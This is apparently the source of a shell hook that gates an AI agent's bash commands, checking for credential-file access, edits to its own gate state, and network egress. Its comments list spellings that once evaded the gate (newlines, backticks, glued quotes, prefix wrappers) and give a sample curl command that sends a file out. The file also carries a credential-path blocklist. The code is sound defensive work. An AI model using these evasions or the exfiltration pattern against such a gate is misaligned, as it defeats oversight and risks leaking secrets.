# The costs, stated rather than hidden: the command text lands on disk transiently, so it
# is created by `mktemp` (mode 600, unpredictable name, never a fixed path a symlink could
# aim at) and removed through `writ_on_exit`, not `trap ... EXIT`, because bash allows one
# EXIT trap and installing a second one silently disabled a hook's telemetry once already
# (pinned by tests/test_exit_trap_ownership.py).
#
# "EVERY EXIT PATH" WOULD BE AN OVERSTATEMENT, so it is not claimed. `writ_on_exit` covers
# normal exits and the fault paths; an UNTRAPPED FATAL SIGNAL does not run it, and review
# reproduced that with a restrictive `ulimit -f`, where the write died on SIGXFSZ (rc 153)
# and left a partial file holding real command text. SIGKILL, an OOM kill, SIGSEGV and a
# power loss are the same shape, and the window is the hook's whole remaining runtime
# rather than a narrow race.
#
# WHY THAT IS ACCEPTED RATHER THAN ENGINEERED AROUND: mode 600 means the only reader is
# this uid, and this uid is the agent's own, which already holds the command in its
# process arguments and its environment. So the file adds no reader that did not already
# have the text, and trapping every fatal signal to shorten a window that exposes nothing
# new would be machinery bought for an appearance. A command carrying a secret is a
# separate concern that predates this transport.
#
# WHY NOT STDIN, which the ADR prefers: stdin is already occupied by the quoted heredoc
# that carries this ~1,900-line program. Moving the program to a file would free stdin and
# delete this temp file, and that is the right end state, but seven test modules slice the
# program out of this hook by searching for that heredoc marker (the FIRST one in the
# file, which is why no comment above this line may spell it) and one compares its mirror
# block textually against writ/session/bash_tokens.py, so it is a structural refactor of
# the most heavily pinned file in the repo and is named as the follow-up instead. Passing
# the ~100 KB program on argv is the ADR's "bounded in practice" trap at its worst.
#
# A FAILED mktemp OR A FAILED WRITE IS A FAULT, NOT AN EMPTY COMMAND. This is the same
# distinction the sentinel makes below: "no command to look at" and "the command could not
# be handed over" are different states, and only one of them is safe to allow.
CMD_FILE=$(mktemp "${TMPDIR:-/tmp}/writ-bashcmd.XXXXXXXXXX" 2>/dev/null) || CMD_FILE=""
_writ_bash_gate_cleanup() { [ -n "${CMD_FILE:-}" ] && rm -f "$CMD_FILE"; }
writ_on_exit _writ_bash_gate_cleanup
if [ -z "$CMD_FILE" ] || ! printf '%s' "$CMD" > "$CMD_FILE" 2>/dev/null; then
    writ_decider_fault "writ-bash-write-gate" "bash-write-extractor" \
        "the command could not be handed to the extractor (no writable temporary file), so no credential, gate-state, write-target or egress check ran on it"
    exit 0
fi

# `|| true` STAYS, and the sentinel below is why that is now safe. Under `set -e` a
# non-zero python here would abort the hook (a visible hook error, but also no decision),
# so the status is not read from `$?`; it is read from whether the block PRINTED that it
# finished. That is ADR property 3: the outcome is observed, never inferred from an empty
# value.
TARGETS=$(WRIT_BASH_CMD_FILE="$CMD_FILE" WRIT_CWD="$(pwd)" WRIT_DIR="$WRIT_DIR" python3 <<'PY' 2>/dev/null || true
import os, re, shlex, sys

# `~name` resolves through the password database (see expand_word), so an unavailable
# module must leave that spelling LITERAL rather than raise, taking the whole extractor
# (and with it every credential and egress row) down with it.
try:
    import pwd
except Exception:
    pwd = None

# The command arrives as a PATH and is read here, in process. See the note above this
# heredoc for why the value itself no longer crosses. `errors="surrogateescape"` is not
# decoration: `os.environ` decoded the retired env string that way, so a command carrying
# a byte that is not valid UTF-8 has to produce the SAME python string through the file or
# the transport would quietly change a verdict. No default and no try/except: an
# unreadable command file is a fault, and a fault must reach the consumer as a MISSING
# completion sentinel, not as an empty command that reads like "nothing to gate".
with open(os.environ["WRIT_BASH_CMD_FILE"], encoding="utf-8", errors="surrogateescape") as _cmd_fh:
    cmd = _cmd_fh.read()
cwd = os.environ.get("WRIT_CWD", "") or os.getcwd()

# THE COMPLETION SENTINEL, printed as this block's LAST line on every path that finished.
# The consumer used to collapse two states into one: "ran and found nothing", which is the
# hot path for almost every command, and "did not run", which is the defect this cycle
# closes. Both looked like empty output. This row says which. Its spelling can never
# collide with a real row: every row's first field is one of cred/state/local/outside/
# unknown/egress, and the consumer STRIPS this line before any arm sees TARGETS. The text
# is spelled here as a literal and in bash as WRIT_EXTRACTOR_SENTINEL (common.sh) because
# this heredoc is QUOTED, so no bash value interpolates into it; see the note there for why
# two literals beat a third env channel.
STATUS_COMPLETE = "status\tcomplete"

# Credential classification: SINGLE SOURCE is writ.session.gates._is_credential_path.
sys.path.insert(0, os.environ.get("WRIT_DIR", ""))
try:
    from writ.session.gates import _is_credential_path as is_cred
except Exception:
    # Minimal fallback (only if the package import fails -- the server gate would be
    # down too). Covers the headline secrets so the org boundary still holds.
    import fnmatch
    _DIRS = ("/.ssh/", "/secrets/", "/secret/", "/.gnupg/", "/.kube/")
    _ALLOW = (".env.example", ".env.sample", ".env.template", ".env.dist",
              ".env.defaults", "example.env", "sample.env", "template.env")
    _KEXT = (".key", ".pem", ".p12", ".pfx", ".keystore", ".jks", ".ppk")
    _GLOBS = ("*.key", "*.pem", "*.p12", "*.pfx", "*.keystore", "*.jks", "*.ppk",
              "*.asc", "*.gpg", "*.env", "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519",
              ".htpasswd", ".pgpass", ".netrc", ".npmrc", ".pypirc", ".dockercfg",
              "kubeconfig", ".env", ".env.*")
    def is_cred(path):
        if not path:
            return False
        low = path.replace("\\", "/").lower(); norm = "/" + low.strip("/") + "/"
        if any(s in norm for s in _DIRS):
            return True
        b = os.path.basename(low)
        if b in _ALLOW:
            return False
        if b.endswith(".pub"):
            return any(b[:-4].endswith(e) for e in _KEXT)
        if b == "credentials":
            return True
        return any(fnmatch.fnmatch(b, g) for g in _GLOBS)


# Writ gate state: mode, approved gates and the manual-testing grant. The agent
# editing these would be approving its own gates, so they are denied in any mode.
# Defined outside the try/except above so it exists on BOTH the package-import and
# fallback paths. Mirrors writ-state-write-gate.sh, which covers Write/Edit.
_WRIT_HOME = os.environ.get("WRIT_DIR", "")
_STATE_DIR = os.environ.get("WRIT_CACHE_DIR") or (
    os.path.join(_WRIT_HOME, "var", "session") if _WRIT_HOME else ""
)
_POINTER = "/tmp/writ-current-session"


def is_gate_state(path):
    if not path:
        return False
    try:
        ap = os.path.realpath(os.path.abspath(path))
    except Exception:
        return False
    try:
        if ap == os.path.realpath(os.path.abspath(_POINTER)):
            return True
    except Exception:
        pass
    if not _STATE_DIR:
        return False
    try:
        sd = os.path.realpath(os.path.abspath(_STATE_DIR))
    except Exception:
        return False
    return ap == sd or ap.startswith(sd + os.sep)


NONFILE = {"/dev/null", "/dev/stdout", "/dev/stderr", "/dev/tty", "/dev/zero", "-", ""}
# `"\x00"` IS the SEP sentinel split_commands inserts (writ.session.bash_tokens.SEP),
# spelled as a LITERAL rather than as the name so this line stays ast.literal_eval-able:
# tests/test_bash_control_operator_split.py derives its whole operator matrix by parsing
# this assignment, and a NAME here makes that derivation raise. A test asserts the member
# EQUALS the shared constant, so the two spellings cannot drift. The old "\n" member is
# GONE because it never matched anything: shlex discards newlines, which is the defect
# cycle R closes.
CONTROL = {"|", "||", "&&", ";", "&", "\x00"}
REDIR = re.compile(r'^(?:&|[0-9]*)>>?')

# ── Control-operator splitting ──────────────────────────────────────────────
# SINGLE SOURCE is writ.session.bash_tokens.split_control_operators. The mirror below is
# that module's marker-delimited block, verbatim, and it runs ONLY if the package import
# fails (the hooks run under the system python3 and reach the package through the
# sys.path insert above); the import after it REBINDS the name, so the package copy is
# what runs whenever it resolves. A failed import must degrade to the same behavior and
# never silently back to the defect, which is why this is a mirror and not a comment.
# tests/test_bash_control_operator_split.py asserts the copies are textually identical
# and compute identical token streams.

# MIRROR BEGIN split_control_operators
# The marker name is historical: this block is now every bash-token helper the two Bash
# gates SHARE, not the splitter alone. The markers keep their spelling because they are
# the anchor tests/test_bash_control_operator_split.py slices on.

# Tokens that occupy VERB POSITION without being the verb. A group opener, or a reserved
# word that a COMMAND LIST follows, is stepped over exactly the way the WRAPPERS prefixes
# are, because what follows is a real command that really writes: `if true; then cp a
# src/x.py; fi` runs cp, and `(cp a src/x.py)` runs cp.
#
# Each member, and why it is here:
#   ( {                  group openers; a command list follows directly.
#   then do else         reserved words a command list follows directly.
#   if elif while until  a CONDITION follows, which is itself a command list:
#                        `if cp seed.txt .env; then :; fi` really runs cp.
#   !                    pipeline negation; `! cp a b` runs cp.
#
# DELIBERATELY ABSENT, each for a reason:
#   [ [[ test            these ARE the verb, and the write gate suppresses redirects for
#                        a segment whose verb is one of them (seg_is_test). Stepping over
#                        `[[` would make `"$x"` the verb, un-suppress the span, and read
#                        `if [[ "$x" > "config.txt" ]]` as a write to config.txt.
#   (( $((               ARITHMETIC, not a group. The write gate's own `((`/`))` depth
#                        counter owns that spelling; see strip_group_opener.
#   for select case in   what follows is a VARIABLE NAME or a WORD, not a command, so
#                        stepping resolves a WRONG verb instead of recovering a hidden
#                        one. A loop BODY is still covered, because `do` is here.
#   fi done esac } )     closers; nothing follows them inside their segment. A BARE `)`
#                        gets its own treatment; see GROUP_CLOSER_TOKENS.
#   coproc function      both take an OPTIONAL NAME before the command, and an optional
#                        name is not distinguishable from the command itself, so stepping
#                        over it resolves a WRONG verb as often as it recovers a hidden
#                        one. That reason stands on its own. It used to be given as "the
#                        same reason timeout / stdbuf / nice / setsid / xargs / watch are
#                        not WRAPPERS", and that analogy is dead: as of cycle P those six
#                        ARE WRAPPERS entries in writ-bash-write-gate.sh, with STRICT
#                        flag tables, and the one genuine positional among them
#                        (`timeout DURATION`) is stepped precisely because a duration HAS
#                        a checkable shape, which an optional name does not.
GROUP_VERB_TOKENS = frozenset({
    "(", "{", "!", "if", "elif", "then", "else", "while", "until", "do",
})

# Openers that GLUE to the verb, leaving no token boundary to recover:
# shlex.split('(cp seed.txt src/y.py)', posix=False) -> ['(cp', 'seed.txt', 'src/y.py)'].
#
# All three MEASURED silent through this hook's extractor before the fix, which is why the
# two substitution spellings are one case rather than a subshell fix plus a guess:
#   $(cp seed.txt src/y.py)   -> set()
#   `cp seed.txt src/y.py`    -> set()
#   (cp seed.txt src/y.py)    -> set()
# The backtick is the older command-substitution syntax and runs the write exactly as
# `$(...)` does, so leaving it out would be a one-character bypass of this fix.
#
# `{` is NOT here, and the reason is EXECUTED rather than read: `bash -c '{echo hi; }'` is
# a SYNTAX ERROR (`syntax error near unexpected token `}'`) while `bash -c '{ echo hi; }'`
# prints hi. A glued `{` does not merely fail to open a group, it does not parse at all,
# so the spelling cannot be a bypass vector and stripping it would only invent a verb for
# a command bash refuses to run. The bare `{` is in GROUP_VERB_TOKENS instead.
GROUP_OPENER_PREFIXES = ("$(", "(", "`")
# Arithmetic spellings, which must survive stripping untouched.
ARITH_OPENERS = ("((", "$((")

# A group closer that sits ALONE on its own token is SYNTAX, not an argument, and it has
# to be dropped where segments are built rather than normalized where values are
# classified. Two reasons, one measured and one structural:
#
#   * MEASURED, before this cycle: `( echo x | tee src/y.py )` already emitted the
#     phantom row ('local', '/proj/)') beside the real one, because the tee arm collects
#     every argument that is not a flag and not a redirect, and a bare `)` is neither.
#     A fully spaced subshell puts the closer on its own token, so `( cp seed.txt
#     src/y.py )` would resolve `cand[-1]` -- the copy DESTINATION -- to `)`, losing the
#     real target as well as inventing a phantom one, which trades this cycle's blind
#     spot for a worse defect.
#   * STRUCTURAL: strip_unbalanced_close cannot help, because the bare token IS the
#     closer and stripping it would yield "", a NONFILE member, which would DELETE rows
#     rather than correct them. So the token never becomes an argument in the first
#     place.
#
# `]`, `]]` and `))` are deliberately NOT here: the write gate COUNTS those tokens to
# suppress redirects inside a comparison or arithmetic span, so dropping them would
# un-suppress the span. `}` is not here either: bash requires a `;` or `&` before it, the
# splitter already makes that boundary, and a lone `}` therefore never shares a segment
# with a write.
GROUP_CLOSER_TOKENS = frozenset({")"})


def strip_group_opener(tok):
    """A verb-position token with its glued group opener removed.

    `(cp` -> `cp`. `$(cp` -> `cp`. `` `cp `` -> `cp`. `(` -> `(`, because nothing would be
    left to be a verb and GROUP_VERB_TOKENS handles the bare opener. `((total` and `$((3`
    -> unchanged, the arithmetic depth counter owns those. `{cp` -> unchanged, because bash
    does not parse it at all (see GROUP_OPENER_PREFIXES). A QUOTED token -> unchanged,
    because shlex(posix=False) leaves the quote character ON, and a quoted mention must
    never reach command position.
    """
    out = tok
    while not out.startswith(ARITH_OPENERS):
        for p in GROUP_OPENER_PREFIXES:
            if out.startswith(p) and len(out) > len(p):
                out = out[len(p):]
                break
        else:
            break
    return out


def strip_unbalanced_close(tok):
    """A collected value with a group's trailing closer removed: `src/y.py)` -> `src/y.py`,
    `` src/y.py` `` -> `src/y.py`.

    COUNTED, not rstripped, with one rule per closing character because the two
    substitution syntaxes close differently:

      * `)` comes off only while the token holds MORE `)` than `(`, which is what a group
        closer looks like from inside the token that ended the group. A filename carrying a
        BALANCED pair therefore survives: `src/note(1))` -> `src/note(1)`, where
        rstrip(")") would have produced `src/note(1`.
      * a BACKTICK is its own closer, so "more closers than openers" is undefined for it
        and the rule is PARITY: a trailing backtick comes off only while the token's
        backtick count is ODD.

    Never returns the empty string: a one-character token is left alone, because "" is a
    NONFILE member and turning a target into a NONFILE member would DELETE a row that
    exists today instead of correcting it.

    Two measured defects motivate it, in OPPOSITE directions: `(echo x > <secret>)` was a
    silent allow because `<secret>)` is not a credential basename, and
    `(echo x > /dev/null)` emitted ('outside', '/dev/null)') because `/dev/null)` misses
    the NONFILE exact-string set, so ordinary work was being gated.
    """
    out = tok
    while len(out) > 1:
        if out.endswith(")") and out.count(")") > out.count("("):
            out = out[:-1]
            continue
        if out.endswith("`") and out.count("`") % 2:
            out = out[:-1]
            continue
        break
    return out


def split_control_operators(tokens):
    """Re-split posix=False shlex tokens so every control operator is its own token.

    What makes this not a str.replace:

      * a QUOTED span is never split. shlex already terminated it, and
        `sed -i -e 's/a/b/;s/c/d/' f` must stay one argument. A backslash escapes the
        next character for the same reason (`s/a/b/\\;s/c/d/`).
      * `&&` is matched before `&`, and `||` before `|`.
      * an `&` belonging to a REDIRECT is left alone: `2>&1`, `>&2` and `<&3` are
        file-descriptor duplicates, not background operators, and splitting them would
        change how every redirect is read.
      * an `&` immediately followed by `>` is the `&>` redirect operator, so it opens a
        new token instead of becoming one, which is how bash lexes `foo&>file`.

    Deliberately NOT split: `>` itself. `foo>bar`, an operator glued to the verb IN FRONT
    of it, is a different mechanism with no boundary to recover, and both hook headers
    disclose it as an open limit.
    """
    out = []
    for tok in tokens:
        out.extend(_split_one_token(tok))
    return out


def _split_one_token(tok):
    """One token -> the pieces it really is. Returns [tok] when nothing splits."""
    pieces = []
    buf = []
    quote = None
    after_redir = False
    i = 0
    n = len(tok)

    def flush():
        if buf:
            pieces.append("".join(buf))
            del buf[:]

    while i < n:
        ch = tok[i]
        if quote is not None:
            buf.append(ch)
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch == "\\" and i + 1 < n:
            buf.append(ch)
            buf.append(tok[i + 1])
            after_redir = False
            i += 2
            continue
        if ch == "'" or ch == '"':
            quote = ch
            buf.append(ch)
            after_redir = False
            i += 1
            continue
        if ch == ">":
            buf.append(ch)
            i += 1
            if i < n and tok[i] == ">":          # >>
                buf.append(tok[i])
                i += 1
            elif i < n and tok[i] == "|":        # >| clobber override
                buf.append(tok[i])
                i += 1
            after_redir = True
            continue
        if ch == "<":
            while i < n and tok[i] == "<":       # <, <<, <<<
                buf.append(tok[i])
                i += 1
            after_redir = True
            continue
        if ch == "&":
            if after_redir:                      # fd dup: 2>&1, >&2, <&3
                buf.append(ch)
                after_redir = False
                i += 1
                continue
            if i + 1 < n and tok[i + 1] == ">":  # the `&>` redirect operator
                flush()
                buf.append(ch)
                i += 1
                continue
            op = "&&" if tok.startswith("&&", i) else "&"
            flush()
            pieces.append(op)
            i += len(op)
            continue
        if ch == "|":
            op = "||" if tok.startswith("||", i) else "|"
            flush()
            pieces.append(op)
            i += len(op)
            continue
        if ch == ";":
            flush()
            pieces.append(";")
            i += 1
            continue
        buf.append(ch)
        after_redir = False
        i += 1
    flush()
    return pieces or [tok]


def rejoin_glued_words(text, toks):
    """`toks` with every pair shlex split at a QUOTE BOUNDARY put back together.

    `shlex.split(s, comments=False, posix=False)` ends a token at the closing quote of a
    span that STARTED that token, so ONE shell word arrives as TWO tokens whenever an
    unquoted fragment is glued after a leading quoted span. A token that starts UNQUOTED
    absorbs instead, which is why only one of these two spellings was ever broken:

        shlex.split('cp x "$HOME"/y', comments=False, posix=False)
        -> ['cp', 'x', '"$HOME"', '/y']        one bash word, TWO tokens
        shlex.split('cp x $HOME"/y"', comments=False, posix=False)
        -> ['cp', 'x', '$HOME"/y"']            one bash word, one token

    Three DIFFERENT consequences were measured through the real extractor, which is why
    the three spellings in the retired xfails all looked cosmetic: whether the leftover
    fragment starts with `/` decides the direction. `cp x "$HOME"escape.txt` read as
    project-local while bash wrote OUTSIDE the project (an escape, more permissive);
    `cp x "src"/escape.txt` read as `/escape.txt` outside the project while bash wrote
    `src/escape.txt` (an over-block); `echo hi > "$HOME"/escape.txt` kept the quoted head
    and dropped the FILENAME.

    TWO ARGUMENTS, and the second one is forced. This block may not import shlex: it is
    pasted inline into both Bash hooks and
    tests/test_bash_control_operator_split.py::TestTheMirrorBlockNeedsNoImports rejects
    any import statement inside the markers, including one that merely OPENS a wrapped
    line of this very docstring, which is why this sentence is wrapped the way it is.
    So the caller keeps shlex and hands over both the text it split and the tokens it
    got. `text` is the string GIVEN to shlex, which is the
    `split_commands` output and not the raw command: token offsets are offsets into the
    rewritten text.

    ADJACENCY IS READ OFF THE TEXT, NOT OFF shlex. A live `shlex.shlex` with
    whitespace_split=True, read through `instream.tell()` around each `get_token()`,
    reports adjacent for BOTH `cp x "$HOME"/y` and `cp x "$HOME" /y`, so its own state
    cannot separate a glued word from two words. `posix=False` disables quote removal and
    backslash collapsing, so every token is an exact contiguous substring of `text`, and
    the GAP between consecutive matches decides it: empty means one word, whitespace means
    two. shlex with whitespace_split never splits on punctuation, so the quote boundary is
    the ONLY zero-width split it makes and merging on an empty gap reverses exactly that.

    FAIL-SAFE, because a wrong merge is worse than the defect it repairs: if a token is
    not found at or after the cursor, or a gap holds anything other than whitespace, the
    ORIGINAL list is returned and nothing is merged at all.
    """
    out = []
    pos = 0
    for tok in toks:
        start = text.find(tok, pos)
        if start < 0 or text[pos:start].strip():
            return list(toks)
        if out and start == pos:
            out[-1] = out[-1] + tok
        else:
            out.append(tok)
        pos = start + len(tok)
    return out


def dequote(tok):
    """`tok` with its quote CHARACTERS removed, the way a real shell removes them.

    `"c"p` -> `cp`. `"a"b"c"` -> `abc`. `"$HOME"/y` -> `$HOME/y`. `'single'/y` ->
    `single/y`. `"cp"` -> `cp` and `'(cp'` -> `(cp`, both unchanged from the rule this
    replaces.

    NO EXPANSION HAPPENS HERE, and that split is the whole reason two functions exist.
    This one answers what a word SAYS, which is what verb, flag and host resolution ask.
    What a word BECOMES is `expand_word`'s question, it is asked only in VALUE positions,
    and it must keep reading the RAW token because `"$HOME/x"` and `'$HOME/x'` are the
    same bytes after quote removal and have opposite correct answers.

    REPLACES the matched-OUTER-pair rule both hooks carried
    (`t[0] == t[-1] and t[0] in ("'", '"')`), which was correct only for a word quoted end
    to end. It returned `"c"p`, `"$HOME"/y` and `'single'/y` UNCHANGED and turned
    `"a"b"c"` into `a"b"c`. That was survivable only while shlex handed those spellings
    over as two tokens; once rejoin_glued_words hands them over as ONE, the old rule
    leaves quote characters inside a resolved verb, an egress HOST and a recorded worktree
    PATH.

    A BACKSLASH IS LEFT ALONE, including the character after it. Every consumer here asks
    about a name, the write gate's own verb walk already strips a leading backslash
    because `\\git` is git, and collapsing escapes would change what a quoted mention looks
    like to those consumers for no measured gain.

    Every token reaching this function has BALANCED quotes: shlex.split raises ValueError
    on an unbalanced one and both hooks fail open on that before any token exists.
    """
    out = []
    quote = ""
    for ch in tok:
        if quote:
            if ch == quote:
                quote = ""
            else:
                out.append(ch)
        elif ch == "'" or ch == '"':
            quote = ch
        else:
            out.append(ch)
    return "".join(out)


# ── A NEWLINE IS A COMMAND SEPARATOR, AND shlex THROWS IT AWAY ───────────────
# `shlex.split` treats "\n" as ordinary whitespace, so a newline never becomes a token and
# a CONTROL set carrying "\n" matches NOTHING: a multi-line command is flattened into ONE
# segment whose verb is whatever the FIRST line starts with. Both hooks were measured
# failing OPEN on it, one hook per cycle.
#
#   writ-worktree-safety.sh (1.7.0), on "set -e\necho preparing\ngit worktree add
#   scratch/x x": verb "set", no verdict, ALLOWED. A real invocation on any line after the
#   first was invisible.
#
#   writ-bash-write-gate.sh (cycle R), through its own extractor with WRIT_CWD=/proj:
#     "ls\ncp seed.txt src/x.py"                       -> set()                  INVISIBLE
#     "ls ; cp seed.txt src/x.py"                      -> local /proj/src/x.py    control
#     "ls\necho y > src/x.py"                          -> local /proj/src/x.py    VISIBLE
#     "ls\ncurl -d @src/a.txt https://example.invalid" -> set()                  INVISIBLE
#   A newline hid every VERB-DEPENDENT write and every egress row, and hid no REDIRECT,
#   because the redirect loop never consults the verb.
#
# QUOTE-AWARE, because the naive `cmd.split("\n")` reintroduces the exact false positive
# this extractor family exists to remove: a newline INSIDE a quoted string is data, not a
# separator, and cutting there turns one argument into fragments that can land in command
# position. A BACKSLASH-continued line is not a separator either, and the escape branch is
# what keeps it one command.
SEP = "\x00"          # cannot occur in a real command line, so it is unambiguous


def split_commands(text):
    """`text` with every UNQUOTED newline replaced by a spaced SEP sentinel, so shlex
    yields it as its own token and a CONTROL set carrying SEP segments on it."""
    out, quote, escaped = [], None, False
    for ch in text:
        if escaped:
            out.append(ch)
            escaped = False
        elif ch == "\\" and quote != "'":     # no escapes inside single quotes
            out.append(ch)
            escaped = True
        elif quote:
            out.append(ch)
            if ch == quote:
                quote = None
        elif ch in ("'", '"'):
            out.append(ch)
            quote = ch
        elif ch == "\n":
            out.append(" %s " % SEP)
        else:
            out.append(ch)
    return "".join(out)


# A heredoc BODY is data being fed to a command, not commands being run, so the lines
# between `<<WORD` and its terminator are dropped before any segment is judged. Without
# this the newline split above would newly REFUSE a document ABOUT the operation each gate
# watches for, which is the same false-positive class the quote-aware split exists to
# remove, reintroduced through a different door.
#
# ASCII CLASSES SPELLED OUT, not str.isalnum(): this replaces a regex whose classes were
# `[A-Za-z_][A-Za-z0-9_]*`, and isalnum() is Unicode-aware, so it would silently widen the
# population while reading as a faithful translation.
_HD_FIRST = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_"
_HD_REST = _HD_FIRST + "0123456789"


def heredoc_terminator(tok):
    """The terminator WORD a heredoc opener names, or None when `tok` is not an opener.

    STRING OPERATIONS, NOT A REGEX, and that is a contract rather than a preference: this
    block has to run in a namespace with NO IMPORTS (it is pasted inline into two hooks and
    exec'd bare by the mirror tests), and the `re.compile` version it replaces could not.

    Recognized: `<<WORD`, `<<-WORD`, `<<'WORD'`, `<<"WORD"`.
    NOT recognized, each deliberately:
      * `<<<`, a here-STRING, which is a single-token VALUE and has no body at all.
      * an EMPTY delimiter (`<<''`). The retired regex ACCEPTED it, then scanned for a
        token equal to "", found none, and swallowed the rest of the command. Returning
        None keeps a spelling nobody understands from disabling the gate downstream of it.
      * anything whose word is not an identifier: an expansion or a path there is not a
        terminator a token scan can match.
    """
    if not tok.startswith("<<"):
        return None
    rest = tok[2:]
    if rest.startswith("<"):              # `<<<` here-string: a value, not a body
        return None
    if rest.startswith("-"):              # `<<-WORD`; only the word matters here
        rest = rest[1:]
    if rest[:1] in ("'", '"'):
        if len(rest) < 3 or rest[-1] != rest[0]:
            return None
        rest = rest[1:-1]
    if not rest or rest[0] not in _HD_FIRST:
        return None
    for ch in rest:
        if ch not in _HD_REST:
            return None
    return rest


def strip_heredoc_bodies(toks):
    """`toks` with every heredoc BODY removed, the body being the run from the newline that
    FOLLOWS the opener through the terminator word.

    THE SAME-LINE BOUNDARY IS THE REPAIR, and it is why this is not the function
    writ-worktree-safety.sh carried from 1.7.0. That version consumed tokens from
    IMMEDIATELY AFTER the opener and scanned forward for the terminator, so anything
    legitimately following the opener ON ITS OWN LINE was swallowed with the body. EXECUTED
    on a verbatim copy of it: `cat <<'EOF' > docs/notes.txt` over a body line holding
    `echo y > src/x.py`, terminated by `EOF`, went from 11 tokens to 1, LOSING the real
    destination `docs/notes.txt` along with the phantom. Bash starts the body at the next
    NEWLINE; the pre-split above turns every unquoted newline into a SEP token, so the body
    is the run from the FIRST SEP after the opener and everything between the opener and
    that SEP survives.

    THE OPENER TOKEN ITSELF SURVIVES, also load-bearing rather than tidy: `inline_form` in
    writ-bash-write-gate.sh reads any argument starting with `<` as the STDIN form, so the
    opener is the only marker of `python3 <<'PY'`, and the 1.7.0 copy dropped it.

    An opener with NO following SEP strips NOTHING: there is no body in this token stream to
    remove, and consuming to the end would silence the rest of the command.

    RESIDUE, stated because it is a token scan and bash's rule is a LINE rule: a body line
    that names the terminator word mid-line ends the strip early; two openers on one command
    honor only the first terminator; and an opener GLUED to what follows it (`<<'EOF'>f`) is
    not recognized, because this runs on RAW shlex tokens, before split_control_operators.
    All three fail CLOSED, leaving an extra row rather than losing one.
    """
    out, i, n = [], 0, len(toks)
    while i < n:
        word = heredoc_terminator(toks[i])
        if word is None:
            out.append(toks[i])
            i += 1
            continue
        out.append(toks[i])                       # the opener is syntax, not body
        j = i + 1
        while j < n and toks[j] != SEP:
            out.append(toks[j])                   # `> docs/notes.txt` survives
            j += 1
        if j == n:                                # no newline after the opener: no body
            i = j
            continue
        j += 1                                    # the SEP that starts the body
        while j < n and toks[j] != word:
            j += 1
        i = j + 1                                  # step over the terminator itself
    return out
# MIRROR END split_control_operators
try:
    from writ.session.bash_tokens import split_control_operators   # noqa: F811
    from writ.session.bash_tokens import (                         # noqa: F811
        GROUP_CLOSER_TOKENS, GROUP_VERB_TOKENS, SEP, dequote,
        heredoc_terminator, rejoin_glued_words,
        split_commands, strip_group_opener, strip_heredoc_bodies,
        strip_unbalanced_close)
except Exception:
    pass

# ── Egress allowlist ────────────────────────────────────────────────────────
# SINGLE SOURCE is writ.config.get_egress_allow_hosts (writ.toml [egress] allow_hosts
# + WRIT_EGRESS_ALLOW_HOSTS + WRIT_HOST + the built-in loopback defaults). Resolved
# LAZILY: a write-only command (the common case here) must not pay a config load.
_ALLOW_HOSTS = None


def allow_hosts():
    global _ALLOW_HOSTS
    if _ALLOW_HOSTS is None:
        try:
            from writ.config import get_egress_allow_hosts
            _ALLOW_HOSTS = {h.strip().lower() for h in get_egress_allow_hosts() if h.strip()}
        except Exception:
            # Minimal fallback (only if the package import fails): the built-in
            # defaults plus the two env vars. Narrows the allowlist on failure --
            # a missed import must never OPEN the gate.
            _ALLOW_HOSTS = {"localhost", "127.0.0.1", "::1", "[::1]",
                            (os.environ.get("WRIT_HOST") or "localhost").strip().lower()}
            _ALLOW_HOSTS |= {h.strip().lower() for h
                             in (os.environ.get("WRIT_EGRESS_ALLOW_HOSTS") or "").split(",")
                             if h.strip()}
    return _ALLOW_HOSTS


def is_allowed_host(host):
    """Allowlist membership, HOST only (port already stripped). An empty host means an
    egress-shaped command whose destination could not be named: never allowlisted."""
    if not host:
        return False
    allow = allow_hosts()
    h = host.strip().lower()
    return h in allow or h.strip("[]") in allow or ("[" + h + "]") in allow


def host_of(raw):
    """The host in a URL or host[:port] token: scheme, path/query/fragment, userinfo
    and port stripped, bracketed IPv6 kept intact, lowercased."""
    s = dequote(raw).strip()
    if "://" in s:
        s = s.split("://", 1)[1]
    for sep in ("/", "?", "#"):
        i = s.find(sep)
        if i != -1:
            s = s[:i]
    if "@" in s:
        s = s.rsplit("@", 1)[1]
    if s.startswith("["):
        end = s.find("]")
        if end != -1:
            s = s[:end + 1]
    elif s.count(":") == 1:        # one colon is a port; several mean bare IPv6
        s = s.split(":", 1)[0]
    return s.lower()


def remote_host(tok):
    """Host of an scp/rsync remote spec (`host:path`, `user@host:path`, an rsync:// or
    ssh:// URL), or "" when the token is a LOCAL path. A colon after the first slash is
    part of a filename, not a host separator."""
    s = dequote(tok)
    if "://" in s:
        return host_of(s)
    i = s.find(":")
    if i <= 0:
        return ""
    slash = s.find("/")
    if slash != -1 and slash < i:
        return ""
    part = s[:i]
    if "@" in part:
        part = part.rsplit("@", 1)[1]
    return part.lower()


def bare_host(tok):
    """`[user@]host` with no path at all (the sftp form). "" for a local path."""
    s = dequote(tok)
    if "/" in s or not s:
        return ""
    if "@" in s:
        s = s.rsplit("@", 1)[1]
    return s.lower()


def flat(field):
    """One TSV field. Collapses every whitespace run, so a crafted argument carrying a
    tab or newline cannot forge an extra output line."""
    return " ".join(str(field).split())


# A segment's real verb is not always its first token. Leading NAME=value assignments,
# the transparent wrapper prefixes below, and a leading backslash (`\curl`, which only
# suppresses alias lookup) all sit IN FRONT of it. Reading seg[0] alone let
# `FOO=1 curl -d @x https://host`, `env FOO=1 curl ...`, `command curl ...` and
# `\curl ...` past BOTH the egress pass and the write extractor (`FOO=1 tee f`).
ASSIGNMENT = re.compile(r'^[A-Za-z_][A-Za-z0-9_]*=')
SUDO_VALUE_FLAGS = frozenset({
    "-u", "--user", "-g", "--group", "-h", "--host", "-p", "--prompt",
    "-C", "--close-from", "-D", "--chdir", "-R", "--chroot", "-T", "--command-timeout",
    "-U", "--other-user", "-r", "--role", "-t", "--type", "-a", "--auth-type",
})
SUDO_NOVALUE_FLAGS = frozenset({
    "-A", "--askpass", "-b", "--background", "-B", "--bell", "-E", "--preserve-env",
    "-H", "--set-home", "-i", "--login", "-k", "--reset-timestamp",
    "-K", "--remove-timestamp", "-l", "--list", "-n", "--non-interactive",
    "-N", "--no-update", "-P", "--preserve-groups", "-S", "--stdin", "-s", "--shell",
    "-v", "--validate", "-V", "--version", "-e", "--edit", "--help",
    # Short `-h` is deliberately NOT here: sudo reads it as --host, which takes a value,
    # and the two sets must not disagree about one letter. `--help` stays value-less.
})
